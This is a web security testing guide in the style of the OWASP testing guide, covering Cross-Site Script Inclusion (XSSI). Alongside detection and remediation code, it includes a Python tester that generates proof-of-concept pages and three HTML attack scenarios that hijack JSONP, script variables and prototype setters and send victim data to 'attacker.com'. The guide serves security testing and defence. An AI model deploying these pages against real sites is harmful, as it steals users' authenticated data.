# WSTG-CLNT-13: Testing for Cross-Site Script Inclusion (XSSI)

## Test ID
WSTG-CLNT-13

## Test Name
Testing for Cross-Site Script Inclusion (XSSI)

## High-Level Description

Cross-Site Script Inclusion (XSSI) allows attackers to steal sensitive data by including a victim's JavaScript files as script sources from an attacker-controlled page. This exploits the fact that JavaScript files may contain sensitive user data and are not protected by Same-Origin Policy when loaded as scripts.

---

## What to Check

- [ ] Dynamic JavaScript endpoints
- [ ] JSON responses loadable as scripts
- [ ] JSONP endpoints
- [ ] Authenticated script resources
- [ ] Sensitive data in JavaScript
- [ ] Callback parameter manipulation

---

## How to Test

### Step 1: Identify Dynamic JavaScript

```bash
#!/bin/bash
TARGET="https://target.com"

# Find JavaScript endpoints
echo "[*] Finding JavaScript files..."

# Check for dynamic JS endpoints
curl -s "$TARGET" | grep -oP 'src="[^"]*\.js[^"]*"' | sort -u

# Check for JSONP endpoints
curl -s "$TARGET" | grep -oP 'callback=[^&"]+' | sort -u

# Test JSON endpoints with script inclusion
curl -s "$TARGET/api/user" -H "Accept: application/javascript"
```

### Step 2: XSSI Vulnerability Tester

```python
#!/usr/bin/env python3
"""
XSSI (Cross-Site Script Inclusion) Vulnerability Tester
"""

import requests
import re
from urllib.parse import urljoin, parse_qs, urlparse

class XSSITester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.findings = []
        self.session = requests.Session()

    def find_js_endpoints(self):
        """Find JavaScript endpoints on the page"""
        print(f"[*] Finding JavaScript endpoints on {self.base_url}")

        response = self.session.get(self.base_url)

        # Find script sources
        script_srcs = re.findall(r'src=["\']([^"\']*\.js[^"\']*)["\']', response.text)

        # Find JSONP-like endpoints
        jsonp_patterns = re.findall(r'callback=([^&"\']+)', response.text)

        endpoints = []
        for src in script_srcs:
            full_url = urljoin(self.base_url, src)
            endpoints.append(('script', full_url))

        return endpoints

    def test_jsonp_xssi(self, endpoint):
        """Test JSONP endpoints for XSSI"""
        print(f"\n[*] Testing JSONP endpoint: {endpoint}")

        callbacks = ['callback', 'jsonp', 'cb', 'jsonpcallback', 'func']

        for cb_param in callbacks:
            test_url = f"{endpoint}?{cb_param}=xssiTest"

            try:
                response = self.session.get(test_url)

                # Check if callback is reflected
                if 'xssiTest(' in response.text:
                    print(f"[VULN] JSONP callback reflected: {cb_param}")

                    # Check for sensitive data
                    if self.contains_sensitive_data(response.text):
                        self.findings.append({
                            "type": "JSONP XSSI",
                            "url": test_url,
                            "parameter": cb_param,
                            "severity": "High",
                            "detail": "JSONP returns sensitive data"
                        })
                    else:
                        self.findings.append({
                            "type": "JSONP XSSI",
                            "url": test_url,
                            "parameter": cb_param,
                            "severity": "Medium",
                            "detail": "JSONP callback controllable"
                        })
            except Exception as e:
                pass

    def test_js_hijacking(self, js_url):
        """Test if authenticated JS can be hijacked"""
        print(f"\n[*] Testing JS hijacking: {js_url}")

        # Request without credentials
        response_unauth = requests.get(js_url)

        # Request with credentials (if session exists)
        response_auth = self.session.get(js_url)

        if response_auth.text != response_unauth.text:
            print("[WARN] JavaScript content differs based on authentication")

            if self.contains_sensitive_data(response_auth.text):
                print("[VULN] Authenticated JavaScript contains sensitive data!")
                self.findings.append({
                    "type": "JavaScript Hijacking",
                    "url": js_url,
                    "severity": "High",
                    "detail": "Auth-dependent JS contains sensitive data"
                })

    def test_json_array_hijacking(self, endpoint):
        """Test for JSON array hijacking (older browsers)"""
        print(f"\n[*] Testing JSON array hijacking: {endpoint}")

        response = self.session.get(endpoint)
        content = response.text.strip()

        # Check if response is a JSON array
        if content.startswith('[') and content.endswith(']'):
            print("[INFO] JSON array response detected")

            if self.contains_sensitive_data(content):
                self.findings.append({
                    "type": "JSON Array Hijacking",
                    "url": endpoint,
                    "severity": "Medium",
                    "detail": "JSON array with sensitive data (legacy browsers vulnerable)"
                })

    def contains_sensitive_data(self, content):
        """Check if content contains sensitive data patterns"""
        sensitive_patterns = [
            r'password', r'token', r'api[_-]?key', r'secret',
            r'email', r'phone', r'ssn', r'credit',
            r'session', r'auth', r'bearer', r'private',
            r'"id"\s*:\s*\d+', r'"user', r'"account'
        ]

        for pattern in sensitive_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True
        return False

    def generate_poc(self, vulnerable_url, callback='steal'):
        """Generate XSSI PoC HTML"""
        poc = f'''<!DOCTYPE html>
<html>
<head>
    <title>XSSI PoC</title>
</head>
<body>
    <h1>XSSI Proof of Concept</h1>
    <div id="stolen-data"></div>

    <script>
        // Override Array constructor (JSON Array Hijacking)
        var stolenData = [];
        var originalArray = Array;
        Array = function() {{
            stolenData = this;
            return originalArray.apply(this, arguments);
        }};
        Array.prototype = originalArray.prototype;
    </script>

    <!-- Include target's JavaScript -->
    <script src="{vulnerable_url}"></script>

    <script>
        // For JSONP
        function {callback}(data) {{
            console.log("Stolen data:", data);
            document.getElementById('stolen-data').innerHTML =
                '<pre>' + JSON.stringify(data, null, 2) + '</pre>';

            // Exfiltrate to attacker server
            fetch('https://attacker.com/collect', {{
                method: 'POST',
                body: JSON.stringify(data)
            }});
        }}

        // Check for array hijacking data
        if (stolenData.length > 0) {{
            console.log("Array hijacking data:", stolenData);
        }}
    </script>
</body>
</html>'''
        return poc

    def run_tests(self, auth_cookies=None):
        """Run all XSSI tests"""
        if auth_cookies:
            self.session.cookies.update(auth_cookies)

        # Find endpoints
        endpoints = self.find_js_endpoints()

        # Test each endpoint
        for endpoint_type, url in endpoints:
            if endpoint_type == 'script':
                self.test_js_hijacking(url)

        # Test common JSONP patterns
        common_jsonp = ['/api/user', '/api/data', '/api/profile', '/jsonp']
        for path in common_jsonp:
            self.test_jsonp_xssi(urljoin(self.base_url, path))

        # Test JSON array hijacking
        json_endpoints = ['/api/users', '/api/data', '/api/list']
        for path in json_endpoints:
            self.test_json_array_hijacking(urljoin(self.base_url, path))

        # Generate report
        self.generate_report()

    def generate_report(self):
        """Generate findings report"""
        print("\n" + "="*50)
        print("XSSI SECURITY REPORT")
        print("="*50)

        if not self.findings:
            print("\nNo XSSI vulnerabilities found.")
        else:
            for f in self.findings:
                print(f"\n[{f['severity']}] {f['type']}")
                print(f"  URL: {f['url']}")
                print(f"  Detail: {f['detail']}")

                if f['type'] == 'JSONP XSSI':
                    print(f"\n  PoC:\n{self.generate_poc(f['url'])[:500]}...")

# Usage
tester = XSSITester("https://target.com")
tester.run_tests(auth_cookies={'session': 'valid_session_cookie'})
```

### Step 3: XSSI Attack Scenarios

```html
<!-- Scenario 1: JSONP Data Theft -->
<!DOCTYPE html>
<html>
<body>
    <script>
        function callback(data) {
            // Steal user data
            new Image().src = 'https://attacker.com/log?data=' +
                encodeURIComponent(JSON.stringify(data));
        }
    </script>
    <script src="https://target.com/api/user?callback=callback"></script>
</body>
</html>

<!-- Scenario 2: JavaScript Variable Theft -->
<!DOCTYPE html>
<html>
<body>
    <script src="https://target.com/js/config.js"></script>
    <script>
        // If config.js sets: var userData = {...}
        if (typeof userData !== 'undefined') {
            fetch('https://attacker.com/log', {
                method: 'POST',
                body: JSON.stringify(userData)
            });
        }
    </script>
</body>
</html>

<!-- Scenario 3: Prototype Manipulation -->
<!DOCTYPE html>
<html>
<body>
    <script>
        Object.prototype.__defineSetter__('sensitive', function(val) {
            fetch('https://attacker.com/log?data=' + encodeURIComponent(val));
        });
    </script>
    <script src="https://target.com/api/user.js"></script>
</body>
</html>
```

### Step 4: Manual Testing

```javascript
// Browser console - test for XSSI patterns

// 1. Check if endpoint returns valid JavaScript
fetch('/api/user').then(r => r.text()).then(text => {
    try {
        // Check if it's valid JS
        new Function(text);
        console.log('[!] Endpoint returns executable JavaScript');
    } catch (e) {
        console.log('[OK] Not executable as JavaScript');
    }
});

// 2. Check for JSONP parameters
const jsonpParams = ['callback', 'jsonp', 'cb', 'func', 'jsonpcallback'];
jsonpParams.forEach(param => {
    fetch(`/api/data?${param}=test`).then(r => r.text()).then(text => {
        if (text.includes('test(')) {
            console.log(`[!] JSONP parameter found: ${param}`);
        }
    });
});
```

---

## Tools

| Tool | Purpose |
|------|---------|
| Burp Suite | Intercept and analyze responses |
| Browser DevTools | Monitor script loading |
| Custom PoC | Test XSSI exploitation |
| curl | Manual testing |

---

## Remediation

```python
# Server-side protections

# 1. Avoid JSONP - Use CORS instead
@app.route('/api/user')
def get_user():
    # Don't support callback parameter
    # Use proper CORS headers instead
    response = jsonify(user_data)
    response.headers['Access-Control-Allow-Origin'] = 'https://trusted.com'
    response.headers['Access-Control-Allow-Credentials'] = 'true'
    return response

# 2. Add unexecutable prefix to JSON responses
@app.route('/api/data')
def get_data():
    data = get_sensitive_data()
    # Prefix makes it invalid JavaScript
    response = make_response(")]}',\n" + json.dumps(data))
    response.headers['Content-Type'] = 'application/json'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    return response

# 3. Use POST for sensitive data
@app.route('/api/sensitive', methods=['POST'])
def get_sensitive():
    # POST requests cannot be made via script src
    return jsonify(sensitive_data)

# 4. Validate Content-Type
@app.before_request
def check_content_type():
    if request.path.startswith('/api/'):
        accept = request.headers.get('Accept', '')
        # Reject script-like requests
        if 'text/javascript' in accept or '*/*' in accept:
            if not request.headers.get('X-Requested-With'):
                abort(403)
```

```javascript
// Client-side: Strip prefix from responses
async function fetchSecure(url) {
    const response = await fetch(url, {
        credentials: 'include',
        headers: {
            'X-Requested-With': 'XMLHttpRequest',
            'Accept': 'application/json'
        }
    });

    let text = await response.text();

    // Remove anti-XSSI prefix
    if (text.startsWith(")]}',\n")) {
        text = text.substring(6);
    }

    return JSON.parse(text);
}
```

---

## Risk Assessment

| Finding | CVSS | Severity |
|---------|------|----------|
| JSONP with sensitive user data | 7.5 | High |
| Authenticated JavaScript hijacking | 7.5 | High |
| JSON array with sensitive data | 5.3 | Medium |
| JSONP callback controllable (no sensitive data) | 4.3 | Medium |

---

## CWE Categories

| CWE ID | Title |
|--------|-------|
| **CWE-352** | Cross-Site Request Forgery (CSRF) |
| **CWE-200** | Exposure of Sensitive Information to an Unauthorized Actor |
| **CWE-346** | Origin Validation Error |

---

## References

- [OWASP Testing Guide - XSSI](https://owasp.org/www-project-web-security-testing-guide/)
- [Google - JSON Hijacking](https://security.googleblog.com/)
- [Sebastian Lekies - XSSI Research](https://www.mbsd.jp/Whitepaper/xssi.pdf)

---

## Checklist

```
[ ] Dynamic JavaScript endpoints identified
[ ] JSONP endpoints tested
[ ] Callback parameter manipulation tested
[ ] Authenticated JS content analyzed
[ ] JSON array responses checked
[ ] Sensitive data patterns searched
[ ] PoC created for vulnerabilities
[ ] Findings documented
```
